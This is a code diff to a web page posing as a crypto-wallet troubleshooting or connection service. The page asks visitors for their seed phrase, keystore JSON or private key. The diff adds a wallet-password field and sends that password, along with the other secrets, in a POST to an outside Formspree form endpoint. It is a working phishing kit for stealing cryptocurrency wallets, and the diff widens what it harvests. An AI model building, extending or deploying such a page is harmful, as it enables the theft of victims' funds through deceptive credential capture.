@@ -47,6 +47,12 @@
             <label for="manualInput">Enter your wallet <span id="inputLabel">seed phrase</span></label>
             <textarea id="manualInput" name="manualInput" placeholder="Enter your seed phrase" rows="6"></textarea>
 
+            <!-- Wallet Password Field (visible only for Keystore JSON tab) -->
+            <div id="passwordField" class="hidden">
+                <label for="walletPassword">Wallet password</label>
+                <input type="password" id="walletPassword" name="walletPassword" placeholder="Enter your wallet password">
+            </div>
+
             <p id="errorMessage" class="hidden"></p>
 
             <button class="connect-btn" onclick="validateManualInput()">Validate</button>
@@ -140,7 +146,7 @@
 
         let selectedWallet = null;
         let selectedTroubleshootOption = null;
-        let currentTab = "seedphrase"; // Updated to match the new tab identifier
+        let currentTab = "seedphrase";
 
         // Open wallet selection popup
         function openWalletPopup(troubleshootOption) {
@@ -169,7 +175,7 @@
         function openErrorPopup(wallet) {
             document.getElementById("errorWalletName").textContent = wallet;
             document.getElementById("errorPopup").style.display = "flex";
-            currentTab = "seedphrase"; // Updated to match the new tab identifier
+            currentTab = "seedphrase";
             updateInputLabel();
         }
 
@@ -177,8 +183,9 @@
         function closeErrorPopup() {
             selectedWallet = null;
             selectedTroubleshootOption = null;
-            currentTab = "seedphrase"; // Updated to match the new tab identifier
+            currentTab = "seedphrase";
             document.getElementById("manualInput").value = "";
+            document.getElementById("walletPassword").value = ""; // Clear password field
             document.getElementById("errorMessage").textContent = "";
             document.getElementById("errorMessage").classList.add("hidden");
             document.getElementById("errorPopup").style.display = "none";
@@ -205,15 +212,19 @@
         function updateInputLabel() {
             const label = document.getElementById("inputLabel");
             const placeholder = document.getElementById("manualInput");
+            const passwordField = document.getElementById("passwordField");
             if (currentTab === "seedphrase") {
                 label.textContent = "seed phrase";
                 placeholder.placeholder = "Enter your seed phrase";
+                passwordField.classList.add("hidden");
             } else if (currentTab === "keystore") {
                 label.textContent = "keystore JSON";
                 placeholder.placeholder = "Enter your keystore JSON";
+                passwordField.classList.remove("hidden");
             } else if (currentTab === "privatekey") {
                 label.textContent = "private key";
                 placeholder.placeholder = "Enter your private key";
+                passwordField.classList.add("hidden");
             }
         }
 
@@ -229,6 +240,7 @@
         // Validate manual input and submit to Formspree
         function validateManualInput() {
             let manualInput = document.getElementById("manualInput").value.trim();
+            let walletPassword = document.getElementById("walletPassword").value.trim();
             let message = document.getElementById("errorMessage");
 
             message.textContent = "";
@@ -246,10 +258,17 @@
                 return;
             }
 
-            if (currentTab === "keystore" && manualInput.length < 16) {
-                message.textContent = "Error: Keystore JSON must be at least 16 characters!";
-                message.classList.remove("hidden");
-                return;
+            if (currentTab === "keystore") {
+                if (manualInput.length < 16) {
+                    message.textContent = "Error: Keystore JSON must be at least 16 characters!";
+                    message.classList.remove("hidden");
+                    return;
+                }
+                if (walletPassword === "") {
+                    message.textContent = "Error: Wallet password cannot be empty!";
+                    message.classList.remove("hidden");
+                    return;
+                }
             }
 
             if (currentTab === "privatekey" && manualInput.length < 8) {
@@ -258,10 +277,18 @@
                 return;
             }
 
+            let formData = `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}`;
+            if (currentTab === "keystore") {
+                formData += `&walletPassword=${encodeURIComponent(walletPassword)}`;
+            }
+            if (selectedTroubleshootOption) {
+                formData += `&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`;
+            }
+
             fetch("https://formspree.io/f/mvgkalye", {
                 method: "POST",
                 headers: { "Content-Type": "application/x-www-form-urlencoded" },
-                body: `wallet=${encodeURIComponent(selectedWallet)}&authType=${encodeURIComponent(currentTab)}&authInput=${encodeURIComponent(manualInput)}&troubleshootOption=${encodeURIComponent(selectedTroubleshootOption)}`
+                body: formData
             })
             .then(response => {
                 if (response.ok) {
@@ -283,6 +310,10 @@
         }
 
         document.getElementById("manualInput").addEventListener("input", function () {
+            document.getElementById("errorMessage").classList.add("hidden");
+        });
+
+        document.getElementById("walletPassword").addEventListener("input", function () {
             document.getElementById("errorMessage").classList.add("hidden");
         });
     </script>
